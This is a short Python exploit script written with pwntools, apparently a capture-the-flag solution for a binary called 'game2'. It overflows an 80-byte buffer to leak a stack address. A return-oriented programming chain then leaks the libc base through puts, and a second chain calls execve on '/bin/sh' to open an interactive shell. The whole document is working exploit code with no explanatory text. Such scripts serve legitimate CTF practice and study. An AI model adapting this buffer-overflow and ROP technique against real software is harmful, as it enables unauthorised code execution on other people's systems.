from pwn import *
context.binary = "game2"

def DEBUG(cmd):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

io = process("game2")
elf = ELF("game2")
libc = elf.libc

io.sendafter(">", 'a' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
success("stack -> {:#x}".format(stack))


#  DEBUG("b *0x4006B9\nc")
io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
success("libc.address -> {:#x}".format(libc.address))

pop_rdi_ret=0x400793
'''
ubuntu16.04,libc-2.27.so
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep "pop rdx"
0x0000000000130569 : pop rdx ; pop rsi ; ret
'''
pop_rdx_pop_rsi_ret=libc.address+0x130569


payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])

io.sendafter(">", payload)

io.interactive()